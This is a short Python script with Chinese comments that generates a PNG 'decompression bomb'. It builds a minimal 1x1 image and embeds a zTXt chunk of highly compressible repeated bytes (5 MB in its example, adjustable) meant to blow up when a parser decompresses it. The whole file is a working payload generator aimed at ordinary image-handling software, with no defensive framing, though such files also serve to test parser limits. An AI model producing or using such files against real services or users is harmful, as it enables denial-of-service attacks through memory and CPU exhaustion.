from typing import Tuple, List, BinaryIO
import zlib
import struct

# 像素类型定义
Pixel = Tuple[int, int, int]
Image = List[List[Pixel]]

# PNG 签名
HEADER = b'\x89PNG\r\n\x1A\n'

# 黑色像素 (RGB)
BLACK_PIXEL: Pixel = (0, 0, 0)

def get_checksum(chunk_type: bytes, data: bytes) -> int:
    """计算 chunk 的 CRC 校验和"""
    checksum = zlib.crc32(chunk_type)
    checksum = zlib.crc32(data, checksum)
    return checksum

def write_chunk(out: BinaryIO, chunk_type: bytes, data: bytes) -> None:
    """写入 PNG chunk"""
    out.write(struct.pack('>I', len(data)))  # 长度 (大端序)
    out.write(chunk_type)                    # 类型
    out.write(data)                          # 数据
    checksum = get_checksum(chunk_type, data)
    out.write(struct.pack('>I', checksum))   # CRC

def make_ihdr(width: int, height: int, bit_depth: int = 8, color_type: int = 2) -> bytes:
    """创建 IHDR chunk 数据 (图像头)"""
    return struct.pack('>2I5B', width, height, bit_depth, color_type, 0, 0, 0)

def encode_data(img: Image) -> List[int]:
    """编码图像数据 (简单过滤 + 像素值)"""
    ret = []
    for row in img:
        ret.append(0)  # 无过滤
        color_values = [color_value for pixel in row for color_value in pixel]
        ret.extend(color_values)
    return ret

def compress_data(data: List[int]) -> bytes:
    """压缩 IDAT 数据"""
    data_bytes = bytearray(data)
    return zlib.compress(data_bytes)

def make_ztxt(keyword: str, text: bytes) -> bytes:
    """创建 zTXt 数据: 关键字 + NUL + 方法(0) + 压缩文本"""
    compressed_text = zlib.compress(text)
    data = keyword.encode('ascii') + b'\x00\x00' + compressed_text
    return data

def generate_bomb_png(filename: str, bomb_size: int = 1000000, img_size: int = 1):
    """生成带 zTXt 炸弹的 PNG 文件"""
    # 创建最小图像 (1x1 黑色)
    img: Image = [[BLACK_PIXEL] * img_size for _ in range(img_size)]
    
    with open(filename, 'wb') as out:
        out.write(HEADER)  # PNG 签名
        
        # IHDR chunk
        ihdr_data = make_ihdr(img_size, img_size)
        write_chunk(out, b'IHDR', ihdr_data)
        
        # zTXt 炸弹 chunk
        bomb_text = b'A' * bomb_size  # 重复 'A' 作为炸弹数据
        ztxt_data = make_ztxt('DecompressionBomb', bomb_text)
        write_chunk(out, b'zTXt', ztxt_data)
        
        # IDAT chunk (图像数据)
        idat_data = compress_data(encode_data(img))
        write_chunk(out, b'IDAT', idat_data)
        
        # IEND chunk
        write_chunk(out, b'IEND', b'')

# 使用示例
if __name__ == "__main__":
    generate_bomb_png('bomb.png', bomb_size=5000000)  # 5MB 解压大小
    print("PNG 炸弹文件已生成: bomb.png")